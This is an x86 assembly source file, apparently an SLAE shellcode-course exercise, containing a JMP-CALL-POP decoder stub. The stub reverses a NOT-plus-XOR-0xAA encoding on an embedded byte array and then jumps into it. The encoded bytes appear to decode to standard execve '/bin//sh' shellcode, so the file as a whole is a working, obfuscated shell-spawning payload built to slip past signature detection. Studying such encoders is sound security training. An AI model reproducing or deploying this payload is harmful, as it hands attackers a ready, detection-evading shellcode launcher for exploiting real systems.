;;;;;;;;;;;;;;;;;;;;;;;;;;
;;			;;
;; Author: Anubis	;;
;; SLAE			;;
;;			;;
;;;;;;;;;;;;;;;;;;;;;;;;;;

global _start


section .text

_start:

	jmp short call_decoder 		; Start of JMP CALL POP




decoder_start:

	pop esi 	; Taking the top of the stack (shellcode) and putting it into ESI


decoder:

	cmp byte [esi], 0xaa		; Using 0xaa as an indicator we hit the end of shellcode
	jz shellcode			; If we hit the end, execute shellcode
	not byte [esi]			; Do NOT operation (starting with last encoding first)
	xor byte [esi], 0xAA		; XOR ESI with 0xAA 
	inc esi				; Go byte by byte through ESI
	jmp short decoder		; Loop back through this function to run decoder on every byte
	

call_decoder:

	call decoder_start	; CALL next function, loading shellcode onto top of stack

	shellcode: db 0x64,0x95,0x05,0x3d,0x7a,0x7a,0x26,0x3d,0x3d,0x7a,0x37,0x3c,0x3b,0xdc,0xb6,0x05,0xdc,0xb7,0x06,0xdc,0xb4,0xe5,0x5e,0x98,0xd5,0xaa
